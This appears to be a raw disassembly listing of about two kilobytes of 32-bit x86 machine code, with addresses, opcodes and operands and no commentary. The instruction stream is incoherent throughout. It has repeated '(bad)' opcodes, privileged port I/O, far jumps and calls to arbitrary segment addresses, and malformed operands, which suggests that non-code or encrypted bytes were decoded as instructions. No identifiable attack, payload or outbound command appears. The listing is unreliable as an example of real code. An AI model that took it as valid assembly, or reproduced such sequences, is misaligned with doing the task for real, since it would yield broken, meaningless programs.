  413c3e:	inc    ebx
  413c3f:	xchg   edx,eax
  413c40:	inc    DWORD PTR [ebx+edi*8+0x1b]
  413c44:	xor    esp,esp
  413c46:	inc    eax
  413c47:	sbb    eax,0x1c1eb9b8
  413c4c:	xor    ebp,DWORD PTR cs:[edi+ebp*2-0x51]
  413c51:	imul   edx,DWORD PTR fs:[ecx],0x6c6e4d72
  413c58:	or     BYTE PTR [edx],0x4a
  413c5b:	lahf   
  413c5c:	xchg   ebp,eax
  413c5d:	aaa    
  413c5e:	test   eax,0x9a4764da
  413c63:	or     DWORD PTR [esi+0x1],ecx
  413c66:	(bad)  [esi-0x18]
  413c69:	cmp    bl,BYTE PTR [esi+0x23]
  413c6c:	retf   0x9d5a
  413c6f:	les    edi,FWORD PTR [ecx+edi*2-0x7e7e6d19]
  413c76:	xchg   edx,eax
  413c77:	fbstp  TBYTE PTR [esi]
  413c79:	inc    edx
  413c7a:	ficomp WORD PTR [ebx+0x12]
  413c7d:	and    eax,0xd1022c4
  413c82:	mov    ds,WORD PTR [ebp-0x3f6e70d8]
  413c88:	int    0xb3
  413c8a:	dec    esp
  413c8b:	(bad)  
  413c8c:	inc    ebp
  413c8d:	in     al,dx
  413c8e:	(bad)
  413c91:	jno    0x413ce4
  413c93:	cmp    DWORD PTR [esi-0x301a62c8],0x2f0dd25d
  413c9d:	pop    ebx
  413c9e:	fsub   st,st(4)
  413ca0:	das    
  413ca1:	clc    
  413ca2:	or     al,0x14
  413ca4:	fwait
  413ca5:	das    
  413ca6:	xlat   BYTE PTR ds:[ebx]
  413ca7:	sub    ebp,edx
  413ca9:	call   0xb5ad35d0
  413cae:	mov    eax,0x190da7b9
  413cb3:	fidivr DWORD PTR [esi+ebp*8+0x4d949a1]
  413cba:	push   esp
  413cbb:	jb     0x413cce
  413cbd:	adc    eax,0x9e3f8995
  413cc2:	repnz test cl,dl
  413cc5:	cmp    dh,BYTE PTR [ebx+0x5bdc4da]
  413ccb:	xchg   ecx,esi
  413ccd:	pusha  
  413cce:	(bad)  
  413ccf:	mov    al,0x73
  413cd1:	pop    ebp
  413cd2:	xchg   BYTE PTR [ecx+eiz*8-0xd],ah
  413cd6:	pop    ds
  413cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cd8:	sbb    al,0xbd
  413cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cdb:	push   edi
  413cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cdd:	aad    0xa9
  413cdf:	out    dx,eax
  413ce0:	outs   dx,DWORD PTR ds:[esi]
  413ce1:	test   al,0x57
  413ce3:	mov    cl,cl
  413ce5:	scas   eax,DWORD PTR es:[edi]
  413ce6:	int    0xad
  413ce8:	pop    edi
  413ce9:	out    0x85,al
  413ceb:	into   
  413cec:	push   ss
  413ced:	dec    edx
  413cee:	sbb    al,0x35
  413cf0:	mov    ebp,0xf3cb9265
  413cf5:	pop    ebx
  413cf6:	pop    ds
  413cf7:	dec    eax
  413cf8:	fwait
  413cf9:	jnp    0x413cc9
  413cfb:	push   esp
  413cfc:	sub    dh,BYTE PTR [esi]
  413cfe:	sbb    eax,0x13804011
  413d03:	hlt    
  413d04:	and    eax,0x676fd905
  413d09:	dec    esp
  413d0a:	es jp  0x413d6f
  413d0d:	xor    al,0xcb
  413d0f:	sub    edi,DWORD PTR [edi]
  413d11:	outs   dx,DWORD PTR ds:[esi]
  413d12:	xchg   ebp,eax
  413d13:	jg     0x413ce4
  413d15:	jg     0x413d7d
  413d17:	retf   0xccf
  413d1a:	cmc    
  413d1b:	outs   dx,BYTE PTR ds:[esi]
  413d1c:	inc    esp
  413d1d:	inc    esi
  413d1e:	sub    al,0xbe
  413d20:	pop    ebx
  413d21:	imul   esp,DWORD PTR [edi+0x15],0x4e13a36a
  413d28:	mov    ebp,0xd729d66a
  413d2d:	cmp    bh,BYTE PTR [eax-0x45dcc207]
  413d33:	or     bh,BYTE PTR [esi+0x59]
  413d36:	cli    
  413d37:	int    0x63
  413d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3a:	enter  0x61,0x67
  413d3e:	jnp    0x413dbc
  413d40:	sahf   
  413d41:	or     al,0x9
  413d43:	xchg   BYTE PTR [edi+edx*4],dh
  413d46:	out    dx,eax
  413d47:	into   
  413d48:	or     eax,0xfc81077f
  413d4d:	shl    esp,1
  413d4f:	push   0x38
  413d51:	jmp    0x63a9b39f
  413d56:	inc    ebp
  413d57:	sbb    DWORD PTR [ebp-0x58e383cd],edi
  413d5d:	(bad)  
  413d5e:	push   edx
  413d5f:	and    BYTE PTR [edx+ebp*8+0x3b112648],0xa6
  413d67:	loopne 0x413cf8
  413d69:	push   esp
  413d6a:	lea    ebp,[edi-0x2716bf14]
  413d70:	mov    esi,DWORD PTR [ecx+ecx*1-0xb]
  413d74:	push   ebp
  413d75:	or     esp,DWORD PTR [ebp+0xc0d9ede]
  413d7b:	mov    BYTE PTR [esi],ch
  413d7d:	xor    BYTE PTR [ecx+edi*8],bl
  413d80:	mov    dl,0x75
  413d82:	xor    al,0xf5
  413d84:	sbb    dh,ah
  413d86:	popa   
  413d87:	jl     0x413dde
  413d89:	xchg   ebx,eax
  413d8a:	and    ah,BYTE PTR [ecx+0x4f82cb94]
  413d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d91:	xchg   esp,eax
  413d92:	test   al,0x7e
  413d94:	fimul  DWORD PTR [ebp+0x7d]
  413d97:	push   ss
  413d98:	leave  
  413d99:	mov    edi,0x5e0c9059
  413d9e:	pop    eax
  413d9f:	jle    0x413e15
  413da1:	nop
  413da2:	clc    
  413da3:	hlt    
  413da4:	imul   ebp,DWORD PTR [edi-0x23],0x6cbae174
  413dab:	pusha  
  413dac:	sar    edx,cl
  413dae:	or     al,0xf9
  413db0:	test   BYTE PTR ds:0x426a81f,0x90
  413db7:	add    al,0x98
  413db9:	push   0x5187c7a3
  413dbe:	mov    BYTE PTR [esi+0x5e],cl
  413dc1:	sahf   
  413dc2:	and    bh,cl
  413dc4:	or     BYTE PTR [eax],dl
  413dc6:	sub    eax,0xf74f84eb
  413dcb:	jae    0x413d8d
  413dcd:	lds    esp,FWORD PTR [eax]
  413dcf:	data16 cmp BYTE PTR [ebx],bh
  413dd2:	dec    edx
  413dd3:	fs in  al,0x5c
  413dd6:	and    BYTE PTR [eax+0xd],ah
  413dd9:	ret    0x13d8
  413ddc:	mov    cl,0x93
  413dde:	mov    ecx,0xce60acc6
  413de3:	add    eax,0x31c4d1a0
  413de8:	adc    eax,esp
  413dea:	mov    al,0x39
  413dec:	adc    BYTE PTR [edi+0x4f],bh
  413def:	xlat   BYTE PTR ds:[ebx]
  413df0:	xchg   ecx,eax
  413df1:	inc    ebp
  413df2:	jecxz  0x413e36
  413df4:	data16 arpl WORD PTR [ecx],sp
  413df7:	sub    esp,edx
  413df9:	dec    edi
  413dfa:	sub    dh,dh
  413dfc:	push   esp
  413dfd:	(bad)  
  413dfe:	sbb    DWORD PTR [ebp+eax*4+0x30],ebp
  413e02:	push   ss
  413e03:	in     al,0x1b
  413e05:	and    dl,BYTE PTR [edx-0x1ec7e779]
  413e0b:	mov    ch,0xc4
  413e0d:	mov    DWORD PTR [ebp-0x7c9b385d],eax
  413e13:	or     DWORD PTR [eax],esp
  413e15:	cmp    al,0xc3
  413e17:	test   eax,0x5ec85840
  413e1c:	dec    esi
  413e1d:	inc    ebx
  413e1e:	ins    DWORD PTR es:[edi],dx
  413e1f:	pop    esp
  413e20:	out    0x51,eax
  413e22:	mov    esp,0x84bf2c26
  413e27:	iret   
  413e28:	std    
  413e29:	or     bl,BYTE PTR [ebx+esi*8]
  413e2c:	dec    esp
  413e2d:	lahf   
  413e2e:	out    0xcb,al
  413e30:	xor    DWORD PTR [edx+0x359d6f3f],0x2b
  413e37:	push   ecx
  413e38:	stc    
  413e39:	aad    0x63
  413e3b:	loope  0x413e6b
  413e3d:	and    al,0x45
  413e3f:	stc    
  413e40:	push   esi
  413e41:	xlat   BYTE PTR ds:[ebx]
  413e42:	xchg   esi,eax
  413e43:	adc    esp,DWORD PTR [edx-0x29]
  413e46:	scas   al,BYTE PTR es:[edi]
  413e47:	ds inc edx
  413e49:	scas   eax,DWORD PTR es:[edi]
  413e4a:	inc    esp
  413e4b:	imul   ecx,DWORD PTR [ecx+0x2d],0xfb05dd10
  413e52:	in     eax,dx
  413e53:	adc    BYTE PTR [edi+0x1c],ah
  413e56:	enter  0xfa6e,0xde
  413e5a:	cmp    DWORD PTR [ecx+0x65],ecx
  413e5d:	xor    al,0x28
  413e5f:	shr    esp,1
  413e61:	rol    eax,cl
  413e63:	xor    al,0xe5
  413e65:	test   al,0xdb
  413e67:	cdq    
  413e68:	mov    al,0x85
  413e6a:	test   BYTE PTR [ebx+ebp*2-0x1b],ch
  413e6e:	dec    eax
  413e6f:	test   BYTE PTR [ebp-0x58618196],ah
  413e75:	cmp    DWORD PTR [edx],esp
  413e77:	cmp    eax,0xe9496c63
  413e7c:	inc    edx
  413e7d:	fucomi st,st(7)
  413e7f:	les    eax,FWORD PTR [ebp-0x142baeb9]
  413e85:	out    dx,al
  413e86:	pushf  
  413e87:	jmp    0x413e8b
  413e89:	ins    DWORD PTR es:[edi],dx
  413e8a:	sar    eax,0x88
  413e8d:	mov    ah,cl
  413e8f:	int    0x9b
  413e91:	mov    ecx,0xe458c36
  413e96:	xor    dh,ch
  413e98:	inc    ebx
  413e99:	dec    ebp
  413e9a:	mov    al,0xdc
  413e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9d:	sub    DWORD PTR [esi+0x11],ebx
  413ea0:	add    dl,BYTE PTR [ebx-0x563fbfd1]
  413ea6:	and    dl,bh
  413ea8:	lea    esi,[edx+0x796c2f98]
  413eae:	jb     0x413ede
  413eb0:	dec    eax
  413eb1:	adc    esi,DWORD PTR [ebx-0x4e9d2ef0]
  413eb7:	or     esp,eax
  413eb9:	mov    ah,0x61
  413ebb:	xor    esp,DWORD PTR [edi]
  413ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ebe:	das    
  413ebf:	outs   dx,DWORD PTR ds:[esi]
  413ec0:	movd   DWORD PTR ds:0x1a2920cc,mm4
  413ec7:	xchg   ecx,eax
  413ec8:	dec    esp
  413ec9:	sub    al,0xc0
  413ecb:	mov    esp,0xe445dcd0
  413ed0:	mov    bh,0xd3
  413ed2:	cwde   
  413ed3:	sbb    eax,0x82c745bb
  413ed8:	or     dl,ch
  413eda:	das    
  413edb:	lahf   
  413edc:	dec    esp
  413edd:	lods   eax,DWORD PTR ds:[esi]
  413ede:	jae    0x413ecd
  413ee0:	xchg   BYTE PTR [ebp-0x4a6e053b],bh
  413ee6:	pop    esi
  413ee7:	and    ecx,DWORD PTR ss:[esi+0x42794812]
  413eee:	ds addr16 mov ebx,0x70c4ddaa
  413ef5:	shl    DWORD PTR ds:0x3ef7937f,0xa7
  413efc:	addr16 add ebx,0x12
  413f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f01:	out    dx,eax
  413f02:	imul   edx,edx,0xfffffffe
  413f05:	jge    0x413ef1
  413f07:	adc    eax,0xab34a7b0
  413f0c:	mov    ds:0x1f39ab54,eax
  413f11:	sub    ch,BYTE PTR [edi]
  413f13:	add    eax,0xa905fea9
  413f18:	pop    ecx
  413f19:	xor    BYTE PTR [ecx+edx*2],bl
  413f1c:	cli    
  413f1d:	cdq    
  413f1e:	shl    esi,cl
  413f20:	jb     0x413eac
  413f22:	in     al,0x8c
  413f24:	pop    esp
  413f25:	les    esi,FWORD PTR [ebx]
  413f27:	jbe    0x413f56
  413f29:	mov    esi,DWORD PTR [ebx]
  413f2b:	xchg   edx,eax
  413f2c:	jle    0x413ec1
  413f2e:	jge    0x413eeb
  413f30:	cmc    
  413f31:	loope  0x413f0e
  413f33:	mov    edx,0xaea81e82
  413f38:	lods   eax,DWORD PTR ds:[esi]
  413f39:	mov    eax,0xb6f99041
  413f3e:	pop    es
  413f3f:	dec    esp
  413f40:	sbb    BYTE PTR [ebp-0x1c],0x70
  413f44:	adc    dl,bl
  413f46:	add    al,0xe2
  413f48:	in     al,dx
  413f49:	cs jp  0x413f69
  413f4c:	sbb    al,0x96
  413f4e:	fist   WORD PTR [edi-0x36eff9e1]
  413f54:	mov    ?,WORD PTR [ebp-0x39]
  413f57:	add    al,0x16
  413f59:	scas   eax,DWORD PTR es:[edi]
  413f5a:	dec    esp
  413f5b:	fnsave [edi+0x56]
  413f5e:	ret    0x5141
  413f61:	adc    BYTE PTR [ecx-0x76],ch
  413f64:	push   edi
  413f65:	pop    edi
  413f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f67:	shl    dh,cl
  413f69:	inc    ecx
  413f6a:	pushf  
  413f6b:	cdq    
  413f6c:	call   FWORD PTR [edi]
  413f6e:	pop    es
  413f6f:	adc    DWORD PTR [eax],edx
  413f71:	xor    BYTE PTR ds:0xdd645e4d,cl
  413f77:	out    dx,al
  413f78:	push   ecx
  413f79:	add    DWORD PTR [ecx],ecx
  413f7b:	fimul  DWORD PTR [edx+ecx*1+0x14754863]
  413f82:	test   al,0x2c
  413f84:	xor    al,0x2f
  413f86:	sahf   
  413f87:	mov    bl,0xcb
  413f89:	or     eax,0x37546b58
  413f8e:	in     eax,dx
  413f8f:	aam    0x8d
  413f91:	scas   al,BYTE PTR es:[edi]
  413f92:	arpl   WORD PTR [ecx-0x6d],bx
  413f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f96:	enter  0xcb1d,0x8f
  413f9a:	fisub  DWORD PTR [ebx-0x47]
  413f9d:	rol    ch,1
  413f9f:	adc    cl,BYTE PTR ds:[eax]
  413fa2:	adc    eax,0x28d010e8
  413fa7:	xchg   BYTE PTR [eax],dl
  413fa9:	in     al,0xb3
  413fab:	push   esp
  413fac:	xor    BYTE PTR [eax-0x73],dl
  413faf:	out    0x9b,eax
  413fb1:	arpl   ax,dx
  413fb3:	xor    al,0x1c
  413fb5:	mov    ds:0x31da5ba1,al
  413fba:	icebp  
  413fbb:	pop    esp
  413fbc:	pop    esi
  413fbd:	pop    ebx
  413fbe:	cmp    al,al
  413fc0:	(bad)  
  413fc1:	jae    0x413fc7
  413fc3:	inc    esp
  413fc4:	jmp    0x414020
  413fc6:	push   ebx
  413fc7:	les    edx,FWORD PTR [ebp-0x40]
  413fca:	mov    ebx,0xb741fd
  413fcf:	xchg   ebp,eax
  413fd0:	lahf   
  413fd1:	clc    
  413fd2:	add    BYTE PTR [edi+0x23],ah
  413fd5:	popa   
  413fd6:	fcmovne st,st(4)
  413fd8:	jb     0x413fce
  413fda:	push   es
  413fdb:	push   ds
  413fdc:	fs add al,dl
  413fdf:	mov    esp,0x71832263
  413fe4:	aam    0x66
  413fe6:	ret    0xae48
  413fe9:	scas   eax,DWORD PTR es:[edi]
  413fea:	call   0xdd807827
  413fef:	add    cl,BYTE PTR [esp+eax*1-0x27d62cdb]
  413ff6:	mov    bh,0x3f
  413ff8:	pusha  
  413ff9:	inc    esp
  413ffa:	in     al,dx
  413ffb:	sbb    eax,0xadd7eb2a
  414000:	rcr    DWORD PTR [ebp-0x11892212],cl
  414006:	push   0xdda54133
  41400b:	frndint 
  41400d:	ins    BYTE PTR es:[edi],dx
  41400e:	mov    WORD PTR [edx-0x3f],gs
  414011:	not    BYTE PTR [esi-0x1533d51d]
  414017:	in     al,0x62
  414019:	sbb    edi,eax
  41401b:	daa    
  41401c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41401d:	call   0xf3d:0x972eccb7
  414024:	jne    0x413fdc
  414026:	dec    ebx
  414027:	ja     0x413fd2
  414029:	ss gs ret 0x2d9a
  41402e:	push   ebx
  41402f:	lods   eax,DWORD PTR ds:[esi]
  414030:	test   eax,0xbe35cdf7
  414035:	imul   dl
  414037:	loop   0x414067
  414039:	daa    
  41403a:	sub    dh,cl
  41403c:	nop
  41403d:	(bad)  
  41403e:	mov    es:0xfee0224,al
  414044:	stos   BYTE PTR es:[edi],al
  414045:	ins    BYTE PTR es:[edi],dx
  414046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414047:	ret    
  414048:	cmp    BYTE PTR [ecx+eax*1+0xe],bh
  41404c:	not    DWORD PTR [edi]
  41404e:	pop    edx
  41404f:	or     dl,BYTE PTR [ebp+0x23]
  414052:	(bad)  
  414053:	xchg   ebp,eax
  414054:	sbb    ebp,esp
  414056:	gs jb  0x414065
  414059:	xchg   BYTE PTR [esi-0x15],dh
  41405c:	lods   eax,DWORD PTR ds:[esi]
  41405d:	mov    esi,0xb8f59b88
  414062:	maskmovq mm7,(bad)
  414063:	idiv   DWORD PTR [ecx]
  414065:	mov    gs,WORD PTR [ebx-0x557ebb74]
  41406b:	xchg   DWORD PTR [esi],ebp
  41406d:	xchg   ecx,eax
  41406e:	sbb    eax,ebp
  414070:	imul   eax,edx,0xffffffce
  414073:	iret   
  414074:	sahf   
  414075:	scas   al,BYTE PTR es:[edi]
  414076:	dec    eax
  414077:	xchg   esi,eax
  414079:	push   0xadc1ab40
  41407e:	inc    ebp
  41407f:	outs   dx,DWORD PTR ds:[esi]
  414080:	test   DWORD PTR [ebx+0x49],esp
  414083:	(bad)  
  414084:	in     al,dx
  414085:	ins    DWORD PTR es:[edi],dx
  414086:	jmp    0xd55a:0x9adbe784
  41408d:	daa    
  41408e:	scas   eax,DWORD PTR es:[edi]
  41408f:	add    al,0xe4
  414091:	clc    
  414092:	mov    dl,0x1e
  414094:	pop    edx
  414095:	retf   0xe1b5
  414098:	push   edi
  414099:	pop    edi
  41409a:	and    esp,edi
  41409c:	jne    0x414091
  41409e:	xor    esp,DWORD PTR [ecx-0x21]
  4140a1:	out    dx,eax
  4140a2:	inc    edi
  4140a3:	sahf   
  4140a4:	es js  0x41402a
  4140a7:	out    0xb9,al
  4140a9:	mov    ?,esi
  4140ab:	mov    ecx,0x567ca32
  4140b0:	mov    esi,0x4b926a4e
  4140b5:	lods   al,BYTE PTR cs:[esi]
  4140b7:	pop    edi
  4140b8:	jmp    0xd959d464
  4140bd:	jae    0x414048
  4140bf:	pop    edx
  4140c0:	ret    0x4b64
  4140c3:	adc    BYTE PTR [edx],dl
  4140c5:	mov    ecx,0xec3aa367
  4140ca:	push   edx
  4140cb:	aam    0x3b
  4140cd:	and    al,0xd7
  4140cf:	test   bl,0xe1
  4140d2:	out    dx,eax
  4140d3:	mov    bl,0xa8
  4140d5:	push   ebp
  4140d6:	sub    BYTE PTR [edi],al
  4140d8:	dec    eax
  4140d9:	fwait
  4140da:	xor    eax,0xf5d34e6a
  4140df:	cmp    al,0xb4
  4140e1:	sets   BYTE PTR [eax-0x2ed3589c]
  4140e8:	pusha  
  4140e9:	add    eax,0x667841d1
  4140ee:	push   edi
  4140ef:	rcr    BYTE PTR [eax+0x1],1
  4140f2:	pop    edi
  4140f3:	in     al,0x22
  4140f5:	mov    eax,ds:0xe8ecb5d1
  4140fa:	out    0x68,al
  4140fc:	fisttp QWORD PTR [esi-0x7579c979]
  414102:	into   
  414103:	or     esi,DWORD PTR [eax-0x5c]
  414106:	call   FWORD PTR [edx+0x5a56415f]
  41410c:	xchg   esp,eax
  41410d:	inc    edx
  41410e:	cmc    
  41410f:	dec    edi
  414110:	add    ch,bl
  414112:	pop    es
  414113:	add    ch,BYTE PTR [ebp-0x49]
  414116:	sub    DWORD PTR [eax],esi
  414118:	pushf  
  414119:	pop    ebx
  41411a:	xchg   esp,eax
  41411b:	jbe    0x4140e0
  41411d:	cdq    
  41411e:	stos   BYTE PTR es:[edi],al
  41411f:	fndisi(8087 only) 
  414121:	lahf   
  414122:	mov    esp,0x82536576
  414127:	mov    edi,0xceb7391d
  41412c:	pop    edx
  41412d:	jnp    0x41418b
  41412f:	xor    dh,BYTE PTR [esi+0x4415872a]
  414135:	add    ecx,DWORD PTR [edx-0x1a2f5c35]
  41413b:	mov    edi,0x14b844f4
  414140:	cs stos DWORD PTR es:[edi],eax
  414142:	je     0x414109
  414144:	push   0x629e3777
  414149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41414a:	push   ebx
  41414b:	pop    ebp
  41414c:	lods   al,BYTE PTR ds:[esi]
  41414d:	push   esp
  41414e:	scas   al,BYTE PTR es:[di]
  414150:	mov    esi,edx
  414152:	cmp    DWORD PTR [ebx-0x1b],eax
  414155:	inc    ebx
  414156:	push   0x1387c3e7
  41415b:	dec    eax
  41415c:	mov    eax,ds:0x65cfbeb7
  414161:	in     al,0xed
  414163:	cwde   
  414164:	jnp    0x41413b
  414166:	out    dx,al
  414167:	(bad)  [edi+ecx*1+0x6b]
  41416b:	jle    0x4141dd
  41416d:	fldcw  WORD PTR ds:[ebx]
  414170:	(bad)  
  414171:	jae    0x414103
  414173:	rcr    DWORD PTR [edi-0x4e],1
  414176:	(bad)  
  414177:	pusha  
  414178:	fs cmc 
  41417a:	aad    0xd3
  41417c:	and    eax,0x3f22cbdd
  414181:	sub    eax,0xb846be7a
  414186:	fistp  WORD PTR [edi]
  414188:	mov    edi,DWORD PTR [eax+0x66]
  41418b:	xor    DWORD PTR [ecx-0x15479055],esi
  414191:	or     al,0x32
  414193:	sbb    DWORD PTR cs:[edx-0x125510da],edx
  41419a:	loopne 0x414199
  41419c:	(bad)  
  41419e:	mov    edx,0xd7c17722
  4141a3:	sub    al,dl
  4141a5:	dec    edi
  4141a6:	retf   0xb51b
  4141a9:	push   ss
  4141aa:	into   
  4141ab:	loop   0x414135
  4141ad:	jnp    0x4141e3
  4141af:	rcl    cl,0xb2
  4141b2:	pop    eax
  4141b3:	xchg   esp,eax
  4141b4:	push   ss
  4141b5:	sahf   
  4141b6:	out    0xae,al
  4141b8:	cdq    
  4141b9:	or     dh,BYTE PTR [edi]
  4141bb:	mov    WORD PTR [esi-0x4b],fs
  4141be:	adc    al,0xe1
  4141c0:	jle    0x414179
  4141c2:	push   ebx
  4141c3:	sub    BYTE PTR [ecx-0x3de5b8a1],0x78
  4141ca:	shr    BYTE PTR [edi+edi*8],cl
  4141cd:	inc    edx
  4141ce:	pop    es
  4141cf:	sbb    DWORD PTR [esp+ebx*8-0x47],0x33a3f45c
  4141d7:	mov    ebx,0xac59f954
  4141dc:	push   0x3d0befdc
  4141e1:	or     edx,ebp
  4141e3:	(bad)  
  4141e4:	jno    0x414185
  4141e6:	lods   al,BYTE PTR ds:[esi]
  4141e7:	fwait
  4141e8:	mov    sp,0x53fa
  4141ec:	stos   DWORD PTR es:[edi],eax
  4141ed:	ret    
  4141ee:	xchg   BYTE PTR [ecx-0x4f1cddf3],dh
  4141f4:	or     ebx,esp
  4141f6:	sub    DWORD PTR [esi+edx*4],0x20
  4141fa:	mov    dh,0xa6
  4141fc:	xlat   BYTE PTR ds:[ebx]
  4141fd:	xor    esp,DWORD PTR [ebp+eiz*1+0x5698e9a]
  414204:	add    eax,0x5e73b26
  414209:	dec    ecx
  41420a:	test   BYTE PTR [esi+eax*8-0x55],dl
  41420e:	add    ch,cl
  414210:	dec    esp
  414211:	jge    0x414291
  414213:	in     eax,0x4
  414215:	fs (bad) 
  414218:	test   al,0xde
  41421a:	push   ebx
  41421b:	mov    ds:0xe6bafbdf,al
  414220:	fcom   QWORD PTR [edi]
  414222:	es test eax,0x34f60728
  414228:	ss pop ebp
  41422a:	jne    0x41422d
  41422c:	mov    bh,0xf
  41422e:	pop    ss
  41422f:	sub    DWORD PTR [edx],esp
  414231:	loopne 0x41429d
  414233:	fstp   DWORD PTR [ecx]
  414235:	add    al,0xaa
  414237:	das    
  414238:	arpl   WORD PTR [ebx],ax
  41423a:	push   cs
  41423b:	pusha  
  41423c:	test   esi,ebp
  41423e:	jecxz  0x4141e5
  414240:	mov    ss,WORD PTR [eax]
  414242:	mov    dh,0xe7
  414244:	les    ecx,FWORD PTR [ecx-0x173adbfc]
  41424a:	dec    eax
  41424b:	mov    ah,0x5d
  41424d:	adc    ecx,ebp
  41424f:	cld    
  414250:	add    eax,0x63326dba
  414255:	inc    edx
  414256:	sahf   
  414257:	xchg   dh,dh
  414259:	cmp    DWORD PTR [ebx],esp
  41425b:	and    al,BYTE PTR [ebp+0x72]
  41425e:	sub    eax,0x3a6cfd39
  414263:	popa   
  414264:	lods   eax,DWORD PTR ds:[esi]
  414265:	cmp    al,BYTE PTR [eax+0x6d]
  414268:	fldcw  WORD PTR [edx]
  41426a:	sbb    DWORD PTR [edi],edi
  41426c:	sbb    al,0xf8
  41426e:	fsubr  DWORD PTR [ecx+esi*8]
  414271:	jae    0x41421c
  414273:	out    dx,eax
  414274:	mov    ebp,eax
  414276:	cmp    BYTE PTR [eax+0x55496ead],ah
  41427c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41427d:	mov    edi,0x9ce5dc5f
  414282:	fst    QWORD PTR [esi+eax*8-0x22490c16]
  414289:	mov    ds:0xe6a1e79c,al
  41428e:	add    ch,BYTE PTR [edi+0x3e706363]
  414294:	xchg   ecx,eax
  414295:	js     0x414248
  414297:	ret    
  414298:	iret   
  414299:	push   ebp
  41429a:	fcomp  st(7)
  41429c:	cmc    
  41429d:	stos   BYTE PTR es:[edi],al
  41429e:	lahf   
  41429f:	dec    eax
  4142a0:	mov    edx,0xc08162be
  4142a5:	fisubr DWORD PTR [esp+eiz*4-0x4f]
  4142a9:	sub    DWORD PTR [edx],0xc17adc91
  4142af:	enter  0x9eef,0x95
  4142b3:	das    
  4142b4:	xchg   BYTE PTR [ecx+0x76],al
  4142b7:	xchg   ebx,eax
  4142b8:	adc    eax,0xc6447e67
  4142bd:	test   al,0x81
  4142bf:	pop    ebx
  4142c0:	xchg   edi,eax
  4142c1:	mov    DWORD PTR [ebx],0xc9159cf0
  4142c7:	sub    edi,DWORD PTR [edi]
  4142c9:	add    ecx,ebx
  4142cb:	sub    eax,0x2052b1c2
  4142d0:	add    al,BYTE PTR [edi-0x3a]
  4142d3:	repnz push es
  4142d5:	adc    esi,DWORD PTR [ebx-0x2e]
  4142d8:	inc    eax
  4142d9:	mul    bh
  4142db:	xchg   esi,eax
  4142dc:	ins    BYTE PTR es:[edi],dx
  4142dd:	pop    ss
  4142de:	mov    BYTE PTR [ecx-0x4d9cfcd7],al
  4142e4:	cli    
  4142e5:	shl    BYTE PTR [eax-0x161bcfe2],cl
  4142eb:	and    ebx,DWORD PTR [edi+0x13]
  4142ee:	push   edi
  4142ef:	ss xor BYTE PTR ds:[eax],dh
  4142f3:	call   0x8335:0xbb89c995
  4142fa:	add    al,0xa2
  4142fc:	sti    
  4142fd:	pop    ecx
  4142fe:	pop    es
  4142ff:	iret   
  414300:	mov    ah,0xc
  414302:	cmp    DWORD PTR [edi+0xc8d942b],eax
  414308:	dec    esi
  414309:	retf   
  41430a:	sti    
  41430b:	sub    al,0x2e
  41430d:	cli    
  41430e:	das    
  41430f:	pop    ebx
  414310:	mov    esp,DWORD PTR [ecx+0x73]
  414313:	aam    0xbf
  414315:	jo     0x414345
  414317:	xchg   DWORD PTR [esi+0x3b8045d0],ebx
  41431d:	rcl    DWORD PTR [eax-0x30d2629],0xf7
  414324:	pop    edi
  414325:	add    DWORD PTR [eax+0x7dc37e25],esi
  41432b:	jmp    0x924:0x80a4e3a4
  414332:	sub    eax,0x32c81cea
  414337:	inc    ecx
  414338:	popf   
  414339:	xchg   cl,al
  41433b:	xor    edi,DWORD PTR [edx]
  41433d:	enter  0xc2fa,0x39
  414341:	fadd   st(0),st
  414343:	outs   dx,DWORD PTR ds:[esi]
  414344:	pusha  
  414345:	xchg   edi,eax
  414346:	call   0xa89bf5de
  41434b:	add    DWORD PTR [ecx-0x6],esp
  41434e:	add    al,0x2c
  414350:	fidiv  WORD PTR [eax]
  414352:	push   ss
  414353:	add    dl,dh
  414355:	pop    esp
  414356:	jne    0x41439f
  414358:	leave  
  414359:	jle    0x414340
  41435b:	xchg   bh,cl
  41435d:	lahf   
  41435e:	(bad)  
  41435f:	int3   
  414360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414361:	or     edi,ebx
  414363:	or     edi,DWORD PTR [eax+0x41]
  414366:	(bad)
  414369:	and    ch,BYTE PTR ds:0xeeada542
  41436f:	jmp    0x2207:0xf1db8b2f
  414376:	stos   BYTE PTR es:[edi],al
  414377:	and    bh,cl
  414379:	xchg   edi,eax
  41437a:	aam    0x6f
  41437c:	rcl    BYTE PTR [eax+0x3a94a356],cl
  414382:	adc    al,0xa7
  414384:	pop    edi
  414385:	popf   
  414386:	dec    ecx
  414387:	cwde   
  414388:	adc    DWORD PTR [ebx+ebp*4],0xcd269217
  41438f:	jmp    0xa6be:0x1240f077
  414396:	leave  
  414397:	ret    
  414398:	stc    
  414399:	pop    ecx
  41439a:	jmp    0x75e5:0x768282be
  4143a1:	fstp   TBYTE PTR [ecx]
  4143a3:	fs sbb eax,0x11112501
  4143a9:	das    
  4143aa:	mov    al,0x5a
  4143ac:	mov    esi,ebp
  4143ae:	sub    edx,esi
  4143b0:	or     BYTE PTR [ebp+0x2f09590],bl
  4143b6:	repnz mov ebx,0xfc536fe2
  4143bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143bd:	scas   al,BYTE PTR es:[edi]
  4143be:	out    0x7d,al
  4143c0:	in     eax,dx
  4143c1:	push   cs
  4143c2:	out    0x85,eax
  4143c4:	ret    
  4143c5:	and    eax,0x552787b0
  4143ca:	xlat   BYTE PTR ds:[ebx]
  4143cb:	in     al,0x46
  4143cd:	mov    cl,0xd
  4143cf:	leave  
  4143d0:	cmp    DWORD PTR [ebx+edi*2+0x71a12de1],ecx
